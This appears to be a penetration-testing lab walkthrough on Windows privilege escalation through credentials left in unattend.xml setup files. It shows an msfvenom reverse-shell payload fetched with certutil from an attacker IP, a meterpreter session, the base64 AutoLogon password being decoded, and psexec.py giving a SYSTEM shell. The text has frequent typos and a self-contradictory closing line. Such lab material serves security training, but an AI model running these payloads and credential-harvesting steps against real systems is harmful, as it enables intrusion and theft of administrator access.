

Windows can automate variety of repetative task, such as mass rollout or installation of windows os on many system.

This is typically done through `Unattended Windows Setup Utility`, this tool utilises `Configuration files` that contains specific configurations and user account credentials, specifically the Admin's account Credentials.

The Admininstrators are supposed to delete these configuration files from all systems after operation.

If the `Unattended Windows Setup configuration files` are left on the target system after installation, they can reveal credentails which attacker s can utilize for windows authentication

The `Unattended Windows System utility` will typically ustilize on of the following system configuration information:

- C:/Windows/Panther/Unattended.xml
- C:/Windows/Panther/Autounattended.xml

The password stored in them might be base64 endoded which can be decoded.

Now there might be a case when the admininstratos has changed his password after utilizing these configuration files, in that case even if we able to get password we can get a shell using it or exploit using it

*********************************************************************************************************************************

# We will get access to target machine by simply transferring our payload file using a Python HTTP server, however in reality attacker will exploit some vulnerability and upload his payload

root@attackdefense:~# `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.19.3 LPORT=1234 -f exe > payload.exe`
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
root@attackdefense:~# `ls`
Desktop  payload.exe  thinclient_drives
root@attackdefense:~# `python -m SimpleHTTPServer 80`
Serving HTTP on 0.0.0.0 port 80 ...


C:\Users\student\Desktop>`certutil -urlcache -f http://10.10.19.3/payload.exe payload.exe  `                              
****  Online  ****                                                                                                      
CertUtil: -URLCache command completed successfully.
C:\Users\student\Desktop>`dir`  
12/25/2023  09:51 AM             7,168 payload.exe 

# We will now shut down python server and setup our Multi/handler listner and Manully click on payload or start it on cmd on windows target machine so that we get the meterpreter session

msf5 exploit(multi/handler) > `set payload windows/x64/meterpreter/reverse_tcp`
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > `set LPORT 1234`
LPORT => 1234
msf5 exploit(multi/handler) > `set LHOST 10.10.19.3`
LHOST => 10.10.19.3
msf5 exploit(multi/handler) >` run`

[*] Started reverse TCP handler on 10.10.19.3:1234 
[*] Sending stage (201283 bytes) to 10.5.23.103
[*] Meterpreter session 1 opened (10.10.19.3:1234 -> 10.5.23.103:49782) at 2023-12-25 15:32:39 +0530

meterpreter > 

# We can see that the user is not privileged

meterpreter > `sysinfo`
Computer        : PRIV-ESC
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > `getuid`
Server username: PRIV-ESC\student
meterpreter > `getprivs`

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege

meterpreter > `shell`
Process 5220 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\student\Desktop>`net user`
net user

User accounts for \\PRIV-ESC

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
student                  WDAGUtilityAccount       
The command completed successfully.


C:\Users\student\Desktop>`whoami /priv`
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

C:\Users\student\Desktop>`^C`
Terminate channel 1? [y/N]  y
meterpreter > 

# We can now search manually the file `unattented.xml`

meterpreter > `cd /windows/panther`
meterpreter > `ls`
Listing: C:\windows\panther
===========================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100666/rw-rw-rw-  68        fil   2020-10-27 10:43:44 +0530  Contents0.dir
100666/rw-rw-rw-  12038     fil   2018-11-15 05:35:39 +0530  DDACLSys.log
100666/rw-rw-rw-  24494     fil   2020-10-27 10:43:44 +0530  MainQueueOnline0.que
40777/rwxrwxrwx   0         dir   2018-11-14 12:25:59 +0530  Unattend
40777/rwxrwxrwx   0         dir   2018-11-15 05:35:25 +0530  UnattendGC
40777/rwxrwxrwx   0         dir   2018-11-15 05:38:25 +0530  actionqueue
100666/rw-rw-rw-  2229      fil   2018-11-15 05:35:28 +0530  diagerr.xml
100666/rw-rw-rw-  4296      fil   2018-11-15 05:35:28 +0530  diagwrn.xml
100666/rw-rw-rw-  10006528  fil   2018-11-15 05:33:39 +0530  setup.etl
40777/rwxrwxrwx   0         dir   2018-11-15 05:35:28 +0530  setup.exe
100666/rw-rw-rw-  83991     fil   2018-11-15 05:35:28 +0530  setupact.log
100666/rw-rw-rw-  142       fil   2018-11-15 05:35:28 +0530  setuperr.log
100666/rw-rw-rw-  16640     fil   2020-10-27 10:43:04 +0530  setupinfo
100666/rw-rw-rw-  3519      fil   2020-10-29 10:29:18 +0530  unattend.xml

meterpreter > `download unattend.xml`
[*] Downloading: unattend.xml -> unattend.xml
[*] Downloaded 3.44 KiB of 3.44 KiB (100.0%): unattend.xml -> unattend.xml
[*] download   : unattend.xml -> unattend.xml

NOTE THAT WE COULD HAVE ALSO search this automatically BY METERPETER builtin seach capability

meterpreter > `search`
[-] You must specify a valid file glob to search for, e.g. >search -f *.doc
meterpreter > `search -f unattend.xml`
Found 3 results...
    c:\ProgramData\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml (5366 bytes)
    c:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml (5366 bytes)
    c:\Windows\Panther\unattend.xml (3519 bytes)
meterpreter > 


# Now when we open the content of file we can observe the tag <AutoLogon> has the credentials

root@attackdefense:~# `ls`
Desktop  payload.exe  thinclient_drives  unattend.xml
root@attackdefense:~# `cat unattend.xml `
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="windowsPE">
        <component name="Microsoft-Windows-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <UserData>
                <ProductKey>
                    <WillShowUI>Always</WillShowUI>
                </ProductKey>
            </UserData>
            <UpgradeData>
                <Upgrade>true</Upgrade>
                <WillShowUI>Always</WillShowUI>
            </UpgradeData>
        </component>
        <component name="Microsoft-Windows-PnpCustomizationsWinPE" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <DriverPaths>
                <PathAndCredentials wcm:keyValue="1" wcm:action="add">
                    <Path>$WinPEDriver$</Path>
                </PathAndCredentials>
            </DriverPaths>
        </component>
    </settings>
    <settings pass="specialize">
        <component name="Microsoft-Windows-Deployment" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <RunSynchronous>
                <RunSynchronousCommand wcm:action="add">
                    <Order>1</Order>
                    <Path>cmd /c "FOR %i IN (X F E D C) DO (FOR /F "tokens=6" %t in ('vol %i:') do (IF /I %t NEQ "" (IF EXIST %i:\BootCamp\BootCamp.xml Reg ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v AppsRoot /t REG_SZ /d %i /f )))"</Path>
                </RunSynchronousCommand>
            </RunSynchronous>
        </component>
    </settings>
    <settings pass="oobeSystem">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <FirstLogonCommands>
              <SynchronousCommand wcm:action="add">
                <Description>AMD CCC Setup</Description>
                <CommandLine>%AppsRoot%:\BootCamp\Drivers\ATI\ATIGraphics\Bin64\ATISetup.exe -Install</CommandLine>
                <Order>1</Order>
                <RequiresUserInput>false</RequiresUserInput>
              </SynchronousCommand>
              <SynchronousCommand wcm:action="add">
                  <Description>BootCamp setup</Description>
                  <CommandLine>%AppsRoot%:\BootCamp\setup.exe</CommandLine>
                  <Order>2</Order>
                  <RequiresUserInput>false</RequiresUserInput>
              </SynchronousCommand>
            </FirstLogonCommands>
            <AutoLogon>
                <Password>
                    <Value>QWRtaW5AMTIz</Value>
                    <PlainText>false</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <Username>administrator</Username>
            </AutoLogon>
        </component>
    </settings>
</unattend>
root@attackdefense:~# 

# we can observe below

<AutoLogon>
                <Password>
                    <Value>QWRtaW5AMTIz</Value>
                    <PlainText>false</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <Username>administrator</Username>
            </AutoLogon>

password is `QWRtaW5AMTIz` (base64 encoded) of user Admininstrator

# decoding passsword 

root@attackdefense:~# `echo "QWRtaW5AMTIz" > password.txt`
root@attackdefense:~# `ls`
Desktop  password.txt  payload.exe  thinclient_drives  unattend.xml
root@attackdefense:~# `base64 -d password.txt `
Admin@123root@attackdefense:~# 

password is `Admin@123` of user Admininstrator

# Lets now check this password by trying to get command shell session by `PsExec` (as we saw in SMB exploitation, we can use psexec metaploit module also but here we used python file), and BOOM! yes we got the shell

root@attackdefense:~# `nmap 10.5.23.103`
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-25 15:57 IST
Nmap scan report for 10.5.23.103
Host is up (0.0014s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 1.59 seconds
root@attackdefense:~# `psexec.py Administrator@10.5.23.103`
Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.5.23.103.....
[*] Found writable share ADMIN$
[*] Uploading file lQZOESiu.exe
[*] Opening SVCManager on 10.5.23.103.....
[*] Creating service AVyX on 10.5.23.103.....
[*] Starting service AVyX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>`whoami`
nt authority\system

C:\Windows\system32>


# Now there might be a case when the admininstratos has changed his password after utilizing these configuration files, in that case even if we able to get password we can get a shell using it or exploit using it